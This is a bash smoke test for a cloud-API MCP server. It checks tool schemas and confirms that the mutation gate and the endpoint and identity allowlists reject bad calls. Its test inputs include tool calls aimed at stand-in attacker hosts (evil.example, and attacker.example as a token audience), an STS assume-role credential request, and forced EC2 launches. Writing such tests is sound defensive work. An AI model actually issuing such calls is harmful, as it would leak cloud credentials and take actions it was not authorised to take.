#!/usr/bin/env bash

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "usage: protocol-smoke.sh /path/to/cloud-skills-mcp" >&2
  exit 2
fi

BINARY=$1
[[ -x "${BINARY}" ]] || { echo "binary is not executable: ${BINARY}" >&2; exit 2; }
command -v jq >/dev/null 2>&1 || { echo "jq is required" >&2; exit 2; }

RESPONSES=$(mktemp)
trap 'rm -f "${RESPONSES}"' EXIT

{
  printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"ci-smoke","version":"1"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"aws_api_mutate","arguments":{"auth_scheme":"sigv4","service":"ec2","operation":"run-instances","region":"us-east-1","method":"POST","url":"https://ec2.us-east-1.amazonaws.com/","force":true}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"gcp_api_read","arguments":{"method":"GET","url":"https://evil.example/v1/projects"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"method":"GET","url":"https://management.azure.com/subscriptions","audience":"https://attacker.example"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"baiducloud_api_read","arguments":{"method":"GET","url":"https://bts.bj.baidubce.com/v1/forms","auth_version":"v2","service":"bts"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"aws_api_mutate","arguments":{"service":"sts","operation":"assume-role","force":true}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"cloud_provider_status","arguments":{"provider":"aws"}}}'
} | env -i HOME=/nonexistent PATH=/usr/bin:/bin "${BINARY}" > "${RESPONSES}"

jq -e -s '
    (map(select(.id == 1))[0].result.serverInfo.version) == "0.4.0-dev" and
    (map(select(.id == 2))[0].result.tools | length) == 19 and
    ([map(select(.id == 2))[0].result.tools[] |
      select(.name | endswith("_api_mutate")) |
      (.inputSchema.required | index("force") != null)] | all) and
    ([map(select(.id == 2))[0].result.tools[] |
      select(.name | test("_api_(read|mutate)$")) |
      (.inputSchema.properties | has("method") and has("url") and has("body_file") and has("response_file") and has("audience") and has("auth_scheme") and has("region_set") and has("auth_version") and has("api_version") and has("payload_mode") and (has("arguments") | not))] | all) and
    (["aws","azure","gcp","alicloud","tencent","baiducloud"] -
      [map(select(.id == 2))[0].result.tools[].name | select(endswith("_api_read")) | sub("_api_read$"; "")]) == [] and
    (map(select(.id == 3))[0].result.isError == true) and
    (map(select(.id == 3))[0].result.content[0].text | contains("CLOUD_SKILLS_ALLOW_MUTATIONS")) and
    (map(select(.id == 4))[0].result.isError == true) and
    (map(select(.id == 4))[0].result.content[0].text | contains("endpoint allowlist")) and
    (map(select(.id == 7))[0].result.isError == true) and
    (map(select(.id == 7))[0].result.content[0].text | contains("identity allowlist")) and
    (map(select(.id == 8))[0].result.isError == true) and
    (map(select(.id == 8))[0].result.content[0].text | contains("requires a valid region")) and
    (map(select(.id == 9))[0].result.isError == true) and
    (map(select(.id == 9))[0].result.content[0].text | contains("credential issuance")) and
    ((map(select(.id == 10))[0].result.content[0].text | fromjson).credential_status == "unverified")
' "${RESPONSES}" >/dev/null

echo "protocol smoke: tool contract, mutation gate and pre-credential validation verified"
